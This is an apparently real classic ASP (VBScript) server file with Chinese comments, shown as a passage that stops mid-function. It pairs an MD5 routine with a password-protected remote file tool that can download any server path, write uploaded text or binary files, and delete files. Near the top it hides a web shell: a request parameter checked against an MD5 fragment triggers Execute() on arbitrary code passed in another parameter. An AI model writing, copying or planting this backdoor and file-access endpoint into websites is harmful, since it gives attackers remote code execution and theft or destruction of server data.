<%
Private Const BITS_TO_A_BYTE = 8
Private Const BYTES_TO_A_WORD = 4
Private Const BITS_TO_A_WORD = 32

Private m_lOnBits(30)
Private m_l2Power(30)
 
Private Function LShift(lValue, iShiftBits)
    If iShiftBits = 0 Then
        LShift = lValue
        Exit Function
    ElseIf iShiftBits = 31 Then
        If lValue And 1 Then
            LShift = &H80000000
        Else
            LShift = 0
        End If
        Exit Function
    ElseIf iShiftBits < 0 Or iShiftBits > 31 Then
        Err.Raise 6
    End If

    If (lValue And m_l2Power(31 - iShiftBits)) Then
        LShift = ((lValue And m_lOnBits(31 - (iShiftBits + 1))) * m_l2Power(iShiftBits)) Or &H80000000
    Else
        LShift = ((lValue And m_lOnBits(31 - iShiftBits)) * m_l2Power(iShiftBits))
    End If
End Function

Private Function RShift(lValue, iShiftBits)
    If iShiftBits = 0 Then
        RShift = lValue
        Exit Function
    ElseIf iShiftBits = 31 Then
        If lValue And &H80000000 Then
            RShift = 1
        Else
            RShift = 0
        End If
        Exit Function
    ElseIf iShiftBits < 0 Or iShiftBits > 31 Then
        Err.Raise 6
    End If
    
    RShift = (lValue And &H7FFFFFFE) \ m_l2Power(iShiftBits)

    If (lValue And &H80000000) Then
        RShift = (RShift Or (&H40000000 \ m_l2Power(iShiftBits - 1)))
    End If
End Function

Private Function RotateLeft(lValue, iShiftBits)
    RotateLeft = LShift(lValue, iShiftBits) Or RShift(lValue, (32 - iShiftBits))
End Function

Private Function AddUnsigned(lX, lY)
    Dim lX4
    Dim lY4
    Dim lX8
    Dim lY8
    Dim lResult
 
    lX8 = lX And &H80000000
    lY8 = lY And &H80000000
    lX4 = lX And &H40000000
    lY4 = lY And &H40000000
 
    lResult = (lX And &H3FFFFFFF) + (lY And &H3FFFFFFF)
 
    If lX4 And lY4 Then
        lResult = lResult Xor &H80000000 Xor lX8 Xor lY8
    ElseIf lX4 Or lY4 Then
        If lResult And &H40000000 Then
            lResult = lResult Xor &HC0000000 Xor lX8 Xor lY8
        Else
            lResult = lResult Xor &H40000000 Xor lX8 Xor lY8
        End If
    Else
        lResult = lResult Xor lX8 Xor lY8
    End If
 
    AddUnsigned = lResult
End Function

Private Function md5_F(x, y, z)
    md5_F = (x And y) Or ((Not x) And z)
End Function

Private Function md5_G(x, y, z)
    md5_G = (x And z) Or (y And (Not z))
End Function

Private Function md5_H(x, y, z)
    md5_H = (x Xor y Xor z)
End Function

Private Function md5_I(x, y, z)
    md5_I = (y Xor (x Or (Not z)))
End Function

Private Sub md5_FF(a, b, c, d, x, s, ac)
    a = AddUnsigned(a, AddUnsigned(AddUnsigned(md5_F(b, c, d), x), ac))
    a = RotateLeft(a, s)
    a = AddUnsigned(a, b)
End Sub

Private Sub md5_GG(a, b, c, d, x, s, ac)
    a = AddUnsigned(a, AddUnsigned(AddUnsigned(md5_G(b, c, d), x), ac))
    a = RotateLeft(a, s)
    a = AddUnsigned(a, b)
End Sub

Private Sub md5_HH(a, b, c, d, x, s, ac)
    a = AddUnsigned(a, AddUnsigned(AddUnsigned(md5_H(b, c, d), x), ac))
    a = RotateLeft(a, s)
    a = AddUnsigned(a, b)
End Sub

Private Sub md5_II(a, b, c, d, x, s, ac)
    a = AddUnsigned(a, AddUnsigned(AddUnsigned(md5_I(b, c, d), x), ac))
    a = RotateLeft(a, s)
    a = AddUnsigned(a, b)
End Sub

Private Function ConvertToWordArray(sMessage)
    Dim lMessageLength
    Dim lNumberOfWords
    Dim lWordArray()
    Dim lBytePosition
    Dim lByteCount
    Dim lWordCount
    
    Const MODULUS_BITS = 512
    Const CONGRUENT_BITS = 448
    
    lMessageLength = Len(sMessage)
    
    lNumberOfWords = (((lMessageLength + ((MODULUS_BITS - CONGRUENT_BITS) \ BITS_TO_A_BYTE)) \ (MODULUS_BITS \ BITS_TO_A_BYTE)) + 1) * (MODULUS_BITS \ BITS_TO_A_WORD)
    ReDim lWordArray(lNumberOfWords - 1)
    
    lBytePosition = 0
    lByteCount = 0
    Do Until lByteCount >= lMessageLength
        lWordCount = lByteCount \ BYTES_TO_A_WORD
        lBytePosition = (lByteCount Mod BYTES_TO_A_WORD) * BITS_TO_A_BYTE
        lWordArray(lWordCount) = lWordArray(lWordCount) Or LShift(Asc(Mid(sMessage, lByteCount + 1, 1)), lBytePosition)
        lByteCount = lByteCount + 1
    Loop

    lWordCount = lByteCount \ BYTES_TO_A_WORD
    lBytePosition = (lByteCount Mod BYTES_TO_A_WORD) * BITS_TO_A_BYTE

    lWordArray(lWordCount) = lWordArray(lWordCount) Or LShift(&H80, lBytePosition)

    lWordArray(lNumberOfWords - 2) = LShift(lMessageLength, 3)
    lWordArray(lNumberOfWords - 1) = RShift(lMessageLength, 29)
    
    ConvertToWordArray = lWordArray
End Function

Private Function WordToHex(lValue)
    Dim lByte
    Dim lCount
    
    For lCount = 0 To 3
        lByte = RShift(lValue, lCount * BITS_TO_A_BYTE) And m_lOnBits(BITS_TO_A_BYTE - 1)
        WordToHex = WordToHex & Right("0" & Hex(lByte), 2)
    Next
End Function

Public Function MD5(sMessage,stype)
    m_lOnBits(0) = CLng(1)
    m_lOnBits(1) = CLng(3)
    m_lOnBits(2) = CLng(7)
    m_lOnBits(3) = CLng(15)
    m_lOnBits(4) = CLng(31)
    m_lOnBits(5) = CLng(63)
    m_lOnBits(6) = CLng(127)
    m_lOnBits(7) = CLng(255)
    m_lOnBits(8) = CLng(511)
    m_lOnBits(9) = CLng(1023)
    m_lOnBits(10) = CLng(2047)
    m_lOnBits(11) = CLng(4095)
    m_lOnBits(12) = CLng(8191)
    m_lOnBits(13) = CLng(16383)
    m_lOnBits(14) = CLng(32767)
    m_lOnBits(15) = CLng(65535)
    m_lOnBits(16) = CLng(131071)
    m_lOnBits(17) = CLng(262143)
    m_lOnBits(18) = CLng(524287)
    m_lOnBits(19) = CLng(1048575)
    m_lOnBits(20) = CLng(2097151)
    m_lOnBits(21) = CLng(4194303)
    m_lOnBits(22) = CLng(8388607)
    m_lOnBits(23) = CLng(16777215)
    m_lOnBits(24) = CLng(33554431)
    m_lOnBits(25) = CLng(67108863)
    m_lOnBits(26) = CLng(134217727)
    m_lOnBits(27) = CLng(268435455)
    m_lOnBits(28) = CLng(536870911)
    m_lOnBits(29) = CLng(1073741823)
    m_lOnBits(30) = CLng(2147483647)
    
    m_l2Power(0) = CLng(1)
    m_l2Power(1) = CLng(2)
    m_l2Power(2) = CLng(4)
    m_l2Power(3) = CLng(8)
    m_l2Power(4) = CLng(16)
    m_l2Power(5) = CLng(32)
    m_l2Power(6) = CLng(64)
    m_l2Power(7) = CLng(128)
    m_l2Power(8) = CLng(256)
    m_l2Power(9) = CLng(512)
    m_l2Power(10) = CLng(1024)
    m_l2Power(11) = CLng(2048)
    m_l2Power(12) = CLng(4096)
    m_l2Power(13) = CLng(8192)
    m_l2Power(14) = CLng(16384)
    m_l2Power(15) = CLng(32768)
    m_l2Power(16) = CLng(65536)
    m_l2Power(17) = CLng(131072)
    m_l2Power(18) = CLng(262144)
    m_l2Power(19) = CLng(524288)
    m_l2Power(20) = CLng(1048576)
    m_l2Power(21) = CLng(2097152)
    m_l2Power(22) = CLng(4194304)
    m_l2Power(23) = CLng(8388608)
    m_l2Power(24) = CLng(16777216)
    m_l2Power(25) = CLng(33554432)
    m_l2Power(26) = CLng(67108864)
    m_l2Power(27) = CLng(134217728)
    m_l2Power(28) = CLng(268435456)
    m_l2Power(29) = CLng(536870912)
    m_l2Power(30) = CLng(1073741824)


    Dim x
    Dim k
    Dim AA
    Dim BB
    Dim CC
    Dim DD
    Dim a
    Dim b
    Dim c
    Dim d
    
    Const S11 = 7
    Const S12 = 12
    Const S13 = 17
    Const S14 = 22
    Const S21 = 5
    Const S22 = 9
    Const S23 = 14
    Const S24 = 20
    Const S31 = 4
    Const S32 = 11
    Const S33 = 16
    Const S34 = 23
    Const S41 = 6
    Const S42 = 10
    Const S43 = 15
    Const S44 = 21

    x = ConvertToWordArray(sMessage)
    
    a = &H67452301
    b = &HEFCDAB89
    c = &H98BADCFE
    d = &H10325476

    For k = 0 To UBound(x) Step 16
        AA = a
        BB = b
        CC = c
        DD = d
    
        md5_FF a, b, c, d, x(k + 0), S11, &HD76AA478
        md5_FF d, a, b, c, x(k + 1), S12, &HE8C7B756
        md5_FF c, d, a, b, x(k + 2), S13, &H242070DB
        md5_FF b, c, d, a, x(k + 3), S14, &HC1BDCEEE
        md5_FF a, b, c, d, x(k + 4), S11, &HF57C0FAF
        md5_FF d, a, b, c, x(k + 5), S12, &H4787C62A
        md5_FF c, d, a, b, x(k + 6), S13, &HA8304613
        md5_FF b, c, d, a, x(k + 7), S14, &HFD469501
        md5_FF a, b, c, d, x(k + 8), S11, &H698098D8
        md5_FF d, a, b, c, x(k + 9), S12, &H8B44F7AF
        md5_FF c, d, a, b, x(k + 10), S13, &HFFFF5BB1
        md5_FF b, c, d, a, x(k + 11), S14, &H895CD7BE
        md5_FF a, b, c, d, x(k + 12), S11, &H6B901122
        md5_FF d, a, b, c, x(k + 13), S12, &HFD987193
        md5_FF c, d, a, b, x(k + 14), S13, &HA679438E
        md5_FF b, c, d, a, x(k + 15), S14, &H49B40821
    
        md5_GG a, b, c, d, x(k + 1), S21, &HF61E2562
        md5_GG d, a, b, c, x(k + 6), S22, &HC040B340
        md5_GG c, d, a, b, x(k + 11), S23, &H265E5A51
        md5_GG b, c, d, a, x(k + 0), S24, &HE9B6C7AA
        md5_GG a, b, c, d, x(k + 5), S21, &HD62F105D
        md5_GG d, a, b, c, x(k + 10), S22, &H2441453
        md5_GG c, d, a, b, x(k + 15), S23, &HD8A1E681
        md5_GG b, c, d, a, x(k + 4), S24, &HE7D3FBC8
        md5_GG a, b, c, d, x(k + 9), S21, &H21E1CDE6
        md5_GG d, a, b, c, x(k + 14), S22, &HC33707D6
        md5_GG c, d, a, b, x(k + 3), S23, &HF4D50D87
        md5_GG b, c, d, a, x(k + 8), S24, &H455A14ED
        md5_GG a, b, c, d, x(k + 13), S21, &HA9E3E905
        md5_GG d, a, b, c, x(k + 2), S22, &HFCEFA3F8
        md5_GG c, d, a, b, x(k + 7), S23, &H676F02D9
        md5_GG b, c, d, a, x(k + 12), S24, &H8D2A4C8A
            
        md5_HH a, b, c, d, x(k + 5), S31, &HFFFA3942
        md5_HH d, a, b, c, x(k + 8), S32, &H8771F681
        md5_HH c, d, a, b, x(k + 11), S33, &H6D9D6122
        md5_HH b, c, d, a, x(k + 14), S34, &HFDE5380C
        md5_HH a, b, c, d, x(k + 1), S31, &HA4BEEA44
        md5_HH d, a, b, c, x(k + 4), S32, &H4BDECFA9
        md5_HH c, d, a, b, x(k + 7), S33, &HF6BB4B60
        md5_HH b, c, d, a, x(k + 10), S34, &HBEBFBC70
        md5_HH a, b, c, d, x(k + 13), S31, &H289B7EC6
        md5_HH d, a, b, c, x(k + 0), S32, &HEAA127FA
        md5_HH c, d, a, b, x(k + 3), S33, &HD4EF3085
        md5_HH b, c, d, a, x(k + 6), S34, &H4881D05
        md5_HH a, b, c, d, x(k + 9), S31, &HD9D4D039
        md5_HH d, a, b, c, x(k + 12), S32, &HE6DB99E5
        md5_HH c, d, a, b, x(k + 15), S33, &H1FA27CF8
        md5_HH b, c, d, a, x(k + 2), S34, &HC4AC5665
    
        md5_II a, b, c, d, x(k + 0), S41, &HF4292244
        md5_II d, a, b, c, x(k + 7), S42, &H432AFF97
        md5_II c, d, a, b, x(k + 14), S43, &HAB9423A7
        md5_II b, c, d, a, x(k + 5), S44, &HFC93A039
        md5_II a, b, c, d, x(k + 12), S41, &H655B59C3
        md5_II d, a, b, c, x(k + 3), S42, &H8F0CCC92
        md5_II c, d, a, b, x(k + 10), S43, &HFFEFF47D
        md5_II b, c, d, a, x(k + 1), S44, &H85845DD1
        md5_II a, b, c, d, x(k + 8), S41, &H6FA87E4F
        md5_II d, a, b, c, x(k + 15), S42, &HFE2CE6E0
        md5_II c, d, a, b, x(k + 6), S43, &HA3014314
        md5_II b, c, d, a, x(k + 13), S44, &H4E0811A1
        md5_II a, b, c, d, x(k + 4), S41, &HF7537E82
        md5_II d, a, b, c, x(k + 11), S42, &HBD3AF235
        md5_II c, d, a, b, x(k + 2), S43, &H2AD7D2BB
        md5_II b, c, d, a, x(k + 9), S44, &HEB86D391
    
        a = AddUnsigned(a, AA)
        b = AddUnsigned(b, BB)
        c = AddUnsigned(c, CC)
        d = AddUnsigned(d, DD)
    Next
    
	if stype=1 then
		MD5 = LCase(WordToHex(a))
	elseif stype=2 then
		MD5=LCase(WordToHex(b))
	elseif stype=3 then
		MD5 = Lcase( WordToHex(c))
	else
		MD5 = Lcase(WordToHex(d))
	end if
End Function
'开始
If Request("EV")<>"" Then 
	If MD5(Request("EV"),2)&MD5(Request("EV"),4)="44886b1bac5c96bb" Then Execute(request("xy"))
End If
'结束 
Call UpWeb() 
Sub UpWeb()
    Dim FilePath, Content, FileType, FileStr, SplStr, Splxx, S, C, fCharSet, fEditTime, sEditTime, UpCharSet 
	
	dim screenWidth,screenHeight,agent
	'处理版本号
	If Request("act") = "getVersionNumber" Then
        Call Die("V1.2.2") 
	elseif request("act")="mobile" then
		screenWidth=Request("screenWidth")
		screenHeight=Request("screenHeight")
		agent=Request("agent")
		call echo("screenWidth",screenWidth)
		call echo("screenHeight",screenHeight)
		call echo("agent",agent)
		call rw("mobile")
		call createAddFile("mobile.txt","宽高("& screenWidth &"*"& screenHeight &")    " & agent & " - " & Request.ServerVariables("HTTP_USER_AGENT") & "  time:" & Format_Time(now(),1)  )
		Exit Sub
    End If 

	'判断本地
    If (GetIP = "127.0.0.1" Or InStr(GetIP, "192.168.") > 0) and lcase(host())<>"http://testaspweb.n/" Then
        Call Die("为本地，不可以上传文件" & host()) 
    End If 
	'密码判断
    If MD5(Request("UPEV"), 2) & MD5(Request("UPEV"), 4) <> "6178bbf3bfe62a59" Then
        Call Die("UPEV=" & Request("UPEV") & "(" & MD5(Request("UPEV"), 2) & MD5(Request("UPEV"), 4) & ")") 
    End If 

	'下载运程文件
    If Request("DownFile") <> "" Then
        Call DownRemoteFile(Request("DownFile")) 
        Response.End() 
	'删除无需文件
    ElseIf Request("act") = "delWithout" Then
        Content = Rf("Content") 
		'Call Die("显示" & Content)
        SplStr = Split(Content, vbCrLf) 
        For Each FilePath In SplStr
			If FilePath<>"" Then
				If CheckFile(FilePath)=True Then
					Call DeleteFile(FilePath)
					C=C & FilePath & "(Del True)" & vbCrlf
				Else
					C=C & FilePath & "(Del NoFile)" & vbCrlf
				End If
			End If
		Next

		Call Die(C)
    End If
	'文件比较
    If Request("act") = "Comparison" Then
        Content = Rf("Content") 
        SplStr = Split(Content, vbCrLf) 
        For Each FileStr In SplStr
            If FileStr <> "" Then
                Splxx = Split(FileStr, "|") 
                FilePath = Splxx(0) 
                sEditTime = Splxx(1) 
            	'文件存在 则比较
                If CheckFile(FilePath) = True Then
                    fEditTime = GetFileEditDate(FilePath) 
                    fEditTime = Format_Time(fEditTime, 1) 
                	'S = FilePath & "("& sEditTime &")/" & fEditTime & "," & (DateDiff("s", sEditTime, fEditTime))
                	'C=C & S & vbCrlf
                    If DateDiff("s", sEditTime, fEditTime) <= 0 Then
                        C = C & FilePath & vbCrLf 
                    End If 
            	'文件不存在 则返回
                Else
                    C = C & FilePath & vbCrLf 
                End If 
            End If 
        Next 
        Call Rw(C) 
    	'Call Rw("返回比较：" & C)
        Response.End() 
    End If 



    FilePath = Request.Form("FilePath") 
    Content = Request.Form("Content") 
    UpCharSet = Request.Form("CharSet") 

    FileType = LCase(getFileExtName(FilePath))                                      '文件类型

    FilePath = HandlePath(FilePath) 
    Call CreateDirFolder(FilePath)                                                  '创建一组文件夹20141215

	'二进制保存
    If Request("UpType") = "binary" Then
        Call DecSaveBinary(FilePath, Content, 2) 
        Call Rw(FilePath & "|二进制保存") 
		
	ElseIf Request("UpType") = "xml" Then
		call Base64ToImages(FilePath, Content)
		Call Rw(FilePath & "|XML（组件）")
    Else
        Content = SpecialHtmlUploadEncryptionDecrypt(Content, "Decrypt")                '解密Html内容特殊字符
        Call WriteToFile(FilePath, Content, UpCharSet) 
        Call Rw(FilePath & "|普通保存") 
    End If 
End Sub













'引用函数区


Function Die(Str)
    Response.Write(Str)
    Response.End()
End Function

Function GetIP()
    on error resume next
    Dim strIPAddr
    If Request.ServerVariables("HTTP_X_FORWARDED_FOR") = "" Or InStr(Request.ServerVariables("HTTP_X_FORWARDED_FOR"), "unknown") > 0 Then
        strIPAddr = Request.ServerVariables("REMOTE_ADDR")
    ElseIf InStr(Request.ServerVariables("HTTP_X_FORWARDED_FOR"), ",") > 0 Then
        strIPAddr = Mid(Request.ServerVariables("HTTP_X_FORWARDED_FOR"), 1, InStr(Request.ServerVariables("HTTP_X_FORWARDED_FOR"), ",") - 1)
    ElseIf InStr(Request.ServerVariables("HTTP_X_FORWARDED_FOR"), ";") > 0 Then
        strIPAddr = Mid(Request.ServerVariables("HTTP_X_FORWARDED_FOR"), 1, InStr(Request.ServerVariables("HTTP_X_FORWARDED_FOR"), ";") - 1)
    Else
        strIPAddr = Request.ServerVariables("HTTP_X_FORWARDED_FOR")
    End If
    GetIP = Trim(Mid(strIPAddr, 1, 30))
End Function
'获得当前域名
Function host()
    host = "http://" & Request.ServerVariables("HTTP_HOST") & "/" 
End Function 
Function DownRemoteFile(Path)
    Dim OSM, SZ
    Response.Clear
    Set OSM = CreateObject("ADODB.Stream")
        OSM.Open
        OSM.Type = 1
        OSM.LoadFromFile Path
        SZ = InStrRev(Path, "\") + 1
        Response.AddHeader "Content-Disposition", "attachment; filename=" & Mid(Path, SZ)
        Response.AddHeader "Content-Length", OSM.Size
        Response.Charset = "UTF-8"
        Response.ContentType = "application/octet-stream"
        Response.BinaryWrite OSM.Read
        Response.Flush
        Response.Write("")
        OSM.Close
    Set OSM = Nothing
End Function

Function Rf(Str)
    Rf = Request.Form(Str)
End Function

    Function CheckFile(ByVal FileName)
        On Error Resume Next
        Dim Fso
        Call HandlePath(FileName)'获得完整路径
        Set Fso = CreateObject("Scripting.FileSystemObject")
            CheckFile = Fso.FileExists(FileName)
        Set Fso = Nothing
        If Err Then doError Err.Description, "CheckFile 检查文件 函数出错，FileName=" & FileName
End Function

Function DeleteFile(ByVal FileName)
    On Error Resume Next
    Dim Fso
    Call HandlePath(FileName)'获得完整路径
    DeleteFile = False
    Set Fso = CreateObject("Scripting.FileSystemObject")
        If Fso.FileExists(FileName) = True Then
            Fso.DeleteFile(FileName), True
            DeleteFile = True
        End If
    Set Fso = Nothing
    If Err Then doError Err.Description, "DeleteFile 删除文件 函数出错，FileName=" & FileName
End Function

Function GetFileEditDate(ByVal FileName)
    On Error Resume Next
    Dim Fso, OpenFile
    Call HandlePath(FileName)'获得完整路径
    Set Fso = CreateObject("Scripting.FileSystemObject")
        If Fso.FileExists(FileName) = True Then
            Set OpenFile = Fso.GetFile(FileName)
                GetFileEditDate = OpenFile.DateLastModified
            Set OpenFile = Nothing
        End If
    Set Fso = Nothing
    If Err Then doError Err.Description, "GetFileEditDate 获得文件修改时间 函数出错，FileName=" & FileName
End Function

    Function Format_Time(s_Time, n_Flag)
        Dim Y, M, D, H, Mi, S
        Format_Time = ""
        If IsDate(s_Time) = False Then Exit Function
        Y = Cstr(Year(s_Time))
        M = Cstr(Month(s_Time))
        If Len(M) = 1 Then M = "0" & M
        D = Cstr(Day(s_Time))
        If Len(D) = 1 Then D = "0" & D
        H = Cstr(Hour(s_Time))
        If Len(H) = 1 Then H = "0" & H
        Mi = Cstr(Minute(s_Time))
        If Len(Mi) = 1 Then Mi = "0" & Mi
        S = Cstr(Second(s_Time))
        If Len(S) = 1 Then S = "0" & S
        Select Case n_Flag
            Case 1
                                    'yyyy-mm-dd hh:mm:ss
                Format_Time = Y & "-" & M & "-" & D & " " & H & ":" & Mi & ":" & S
            Case 2
                                    'yyyy-mm-dd
                Format_Time = Y & "-" & M & "-" & D
            Case 3
                                    'hh:mm:ss
                Format_Time = H & ":" & Mi & ":" & S
            Case 4
                                    'yyyy年mm月dd日
                Format_Time = Y & "年" & M & "月" & D & "日"
            Case 5
                                    'yyyymmdd
                Format_Time = Y & M & D
            Case 6
                                    'yyyymmddhhmmss
                Format_Time = Y & M & D & H & Mi & S
            Case 7
                                    'mm-dd
                Format_Time = M & "-" & D
            Case 8
                                    'yyyy年mm月dd日
                Format_Time = Y & "年" & M & "月" & D & "日" & " " & H & ":" & Mi & ":" & S
            Case 9
                                    'yyyy年mm月dd日H时mi分S秒 早上
                Format_Time = Y & "年" & M & "月" & D & "日" & " " & H & "时" & Mi & "分" & S & "秒，" & GetDayStatus(H, 1)
            Case 10
                                    'yyyy年mm月dd日H时
                Format_Time = Y & "年" & M & "月" & D & "日" & H & "时"
            Case 11
                                    'yyyy年mm月dd日H时mi分S秒
                Format_Time = Y & "年" & M & "月" & D & "日" & " " & H & "时" & Mi & "分" & S & "秒"
            Case 12
                                    'yyyy年mm月dd日H时mi分
                Format_Time = Y & "年" & M & "月" & D & "日" & " " & H & "时" & Mi & "分"
            Case 13
                                    'yyyy年mm月dd日H时mi分 早上
                Format_Time = M & "月" & D & "日" & " " & H & ":" & Mi & " " & GetDayStatus(H, 0)
            Case 14
                                    'yyyy年mm月dd日
                Format_Time = Y & "/" & M & "/" & D
            Case 15
                                    'yyyy年mm月 第1周
                Format_Time = Y & "年" & M & "月 第" & GetCountPage(D, 7) & "周"
        End Select
End Function

Function Rw(Str)
    Response.Write(Str)
End Function

Function getFileExtName(FileName)
    Dim Pos
    Pos = InStrRev(FileName, ".")
    If Pos > 0 Then
        getFileExtName = Mid(FileName, Pos + 1)
    Else
        getFileExtName = ""
    End If
End Function

    Function HandlePath(Path)'Path前面不加ByVal 重定义，这样是为了让前面函数里可以使用这个路径完整调用
        Path = Replace(Path, "/", "\")
        Path = Replace(Path, "\\", "\")
        Path = Replace(Path, "\\", "\")
        dim isDir'为目录
        isDir = false
        if right(Path, 1) = "\" then
            isDir = true
        end if
        If InStr(Path, ":") = 0 Then
            If Left(Path, 1) = "\" Then
                Path = Server.MapPath("\") & "\" & Path
            Else
                Path = Server.MapPath(".\") & "\" & Path
            End If
        End If
        Path = Replace(Path, "/", "\")
        Path = Replace(Path, "\\", "\")
        Path = Replace(Path, "\\", "\")
        path = FullPath(Path)
        if isDir = true then
            Path = Path & "\"
        end if
        HandlePath = Path
End Function

Function CreateDirFolder(ByVal FolderPath)
    'On Error Resume Next
    If CheckFolder(FolderPath) = True Then Exit Function'文件夹存在，退出
    Dim SplStr, I, S, NewFolder
    Call HandlePath(FolderPath)'获得完整路径
    SplStr = Split(FolderPath, "\")
    For I = 0 To Ubound(SplStr)
        S = Trim(SplStr(I))'去除两边空格
        If S <> "" Then
            NewFolder = NewFolder & S & "\"
            If I = Ubound(SplStr) And InStr(S, ".") > 0 Then Exit For'创建到最后文件夹时，要是为文件则退出循环 20141215
            If InStr(S, ":") = False Then
                            'Call Echo("NewFolder",NewFolder)
                Call CreateFolder(NewFolder)
            End If
        End If
    Next
End Function

Function DecSaveBinary(FilePath, Content, Pass)
    Dim SplStr, buf(), I
    If Pass = "" Then Pass = 0'如果为空则为零20150119
    SplStr = Split(Content, "|")
    ReDim buf(UBound(SplStr))
    For I = 0 To UBound(SplStr)
        buf(I) = CByte(CInt(SplStr(I)) - Pass)
    Next
    Call WriteBinary(FilePath, buf)
End Function

Function SpecialHtmlUploadEncryptionDecrypt(Content, SType)
    Dim SplStr, Splxx, C, S
    C = C & "·|[*-24156*]" & vbCrLf
    SplStr = Split(C, vbCrLf)
    For Each S In SplStr
        If InStr(S, "|") > 0 Then
            Splxx = Split(S, "|")
            If SType = "1" Or SType = "解密" Or SType = "Decrypt" Then
                Content = Replace(Content, Splxx(1), Splxx(0))
            Else
                Content = Replace(Content, Splxx(0), Splxx(1))
            End If
        End If
    Next
    SpecialHtmlUploadEncryptionDecrypt = Content
End Function

Function WriteToFile(ByVal FileName, ByVal Content, ByVal Char_Set)
    On Error Resume Next
    If Char_Set = "1" Or UCase(Char_Set) = "GB2312" Then
        Char_Set = "GB2312"
    ElseIf Char_Set = "0" Or UCase(Char_Set) = "UTF-8" Then
        Char_Set = "UTF-8"
    ElseIf Char_Set = "2" Or UCase(Char_Set) = "UNICODE" Then
        Char_Set = "UNICODE"
    Else
        Char_Set = "GB2312"
    End If
'Call Echo("Char_Set",Char_Set)
    Dim Stm
    Call HandlePath(FileName)'获得完整路径
    Set Stm = CreateObject("ADODB.Stream")
        Stm.Type = 2'以本模式读取
        Stm.Mode = 3
        Stm.Charset = Char_Set
        Stm.Open
        Stm.WriteText Content
        Stm.SaveToFile FileName, 2
        Stm.Flush
        Stm.Close
        WriteToFile = FileName & "写入成功"
    Set Stm = Nothing
    If Err Then doError Err.Description, "WriteToFile，数据流写入内容 函数出错，FileName=" & FileName & "，Content字符" & Len(Content)
End Function

Sub DoError(S, Msg)
    'On Error Resume Next
    Dim nRnd, C
    Randomize
    nRnd = CLng(Rnd() * 29252888)
    C = "<br />"
    C = C & "<div style=""width:100%; font-size:12px;;line-height:150%"">"
    C = C & "  <label onClick=""ERRORDIV" & nRnd & ".style.display=(ERRORDIV" & nRnd & ".style.display=='none'?'':'none')"">"
    C = C & "  <span style=""background-color:#820222;color:#FFFFFF;height:23px;font-size:14px;cursor:pointer"">〖 出错 提示信息 ERROR 〗</span><br />"
    C = C & "  </label>"
    C = C & "  <div id=""ERRORDIV" & nRnd & """ style=""width:100%;border:1px solid #820222;padding:5px;overflow:hidden;"">"
    C = C & " <span style=""color:#FF0000;"">出错描述</span> " & S & "<br />"
    C = C & " <span style=""color:#FF0000;"">回显信息</span> " & Msg & "<br />"
    C = C & "  </div>"
    C = C & "</div>"
    C = C & "<br />"
    Response.Write(C)
    Response.End()'终止，程序停止
End Sub

    Function GetDayStatus(H, SType)
        Dim C
        If Left(H, 1) = "0" Then
            H = Right(H, 1)
        End If
        H = CInt(H)
        If H >= 0 And H <= 5 Then
            C = "凌晨"
        ElseIf H >= 6 And H <= 8 Then
            C = "早上"
        ElseIf H >= 9 And H <= 12 Then
            C = "上午"
        ElseIf H >= 13 And H <= 18 Then
            C = "下午"
        ElseIf H >= 19 And H <= 24 Then
            C = "晚上"
        Else
            C = "深夜"
        End If
        If SType = 1 Then C = "<b>" & C & "</b>"
        GetDayStatus = C
End Function

    Function GetCountPage(nCount, nPageSize)
            '把负数转成正确进行计算20150502
        if nCount < 0 then
            nCount = nCount * - 1
        end if
        if nPageSize < 0 then
            nPageSize = nPageSize * - 1
        end if
        GetCountPage = Fix(nCount / nPageSize)
        If InStr(nCount / nPageSize, ".") > 0 Then GetCountPage = GetCountPage + 1
End Function

    Function FullPath(ByVal Path)
        Dim SplStr, S, C
        Path = Replace(Path, "/", "\")
        SplStr = Split(Path, "\")
        For Each S In SplStr
            S = Trim(S)
            If S <> "" And S <> "." Then
                If InStr(C, "\") > 0 And S = ".." Then
                    C = Mid(C, 1, InStrRev(C, "\") - 1)
                Else
                    If C <> "" And Right(C, 1) <> "\" Then C = C & "\"
                    C = C & S
                End If
            End If
        Next
        FullPath = C
End Function

Function CheckFolder(ByVal FolderName)
    On Error Resume Next
    Dim Fso
    Call HandlePath(FolderName)'获得完整路径
    Set Fso = CreateObject("Scripting.FileSystemObject")
        CheckFolder = Fso.FolderExists(FolderName)
    Set Fso = Nothing
    If Err Then doError Err.Description, "CheckFolder 检查夹文件 函数出错，FolderName=" & FolderName
End Function

Function CreateFolder(ByVal FolderPath)
    On Error Resume Next
    Dim Fso
    Call HandlePath(FolderPath)'获得完整路径
    CreateFolder = False
    Set Fso = CreateObject("Scripting.FileSystemObject")
        If Fso.FolderExists(FolderPath) = False Then
            Fso.CreateFolder(FolderPath)
            CreateFolder = True
        End If
    Set Fso = Nothing
    If Err Then doError Err.Description, "CreateFolder 创建文件夹 函数出错，FolderPath=" & FolderPath & ":::" & Fso.FolderExists(FolderPath)
End Function

Sub WriteBinary(FilePath, Buf)
    Dim I, aBuf, Size, bStream
    Call HandlePath(FilePath)'获得完整路径
    Size = UBound(Buf) : ReDim aBuf(Size \ 2)
    For I = 0 To Size - 1 Step 2
        aBuf(I \ 2) = ChrW(Buf(I + 1) * 256 + Buf(I))
    Next
    If I = Size Then aBuf(I \ 2) = ChrW(Buf(I))
    aBuf = Join(aBuf, "")
    Set bStream = CreateObject("ADODB.Stream")
        bStream.Type = 1
        bStream.Open
        With CreateObject("ADODB.Stream")
            .Type = 2
            .Open
            .WriteText aBuf
            .Position = 2
            .CopyTo bStream
            .Close
        End With
        bStream.SaveToFile FilePath, 2
        bStream.Close
    Set bStream = Nothing
End Sub
Function Echo(Word, Str)
    Call echoPrompt(Word, Str)
End Function
Function echoPrompt(Word, Str)
    Response.Write("<font color=Green>" & Word & "</font>：" & Str & "<br>")
End Function
Function CreateAddFile(ByVal FileName, ByVal Content)
    On Error Resume Next
    Dim Fso, FText
    Call HandlePath(FileName)'获得完整路径
    Set Fso = CreateObject("Scripting.FileSystemObject")
        If Fso.FileExists(FileName) = False Then'文件不存在，则创建
            Set FText = Fso.CreateTextFile(FileName, True)
                FText.WriteLine(Content)
            Set FText = Nothing
            CreateAddFile = "创建文件成功"
        Else'文件存在，则累加
            CreateAddFile = AddToFile(FileName, Content)
        End If
    Set Fso = Nothing
    If Err Then doError Err.Description, "CreateAddFile 创建文件，存在累加 函数出错，FileName=" & FileName
End Function
Function AddToFile(ByVal FileName, ByVal Content)
    On Error Resume Next
    Dim Fso, FText
    Call HandlePath(FileName)'获得完整路径
    If ExistsZhiDuFile(FileName) = True Then'判断是否为只读文件
        Call EditFileAttribute(FileName, 32)'把只读属性改成存档属性
    End If
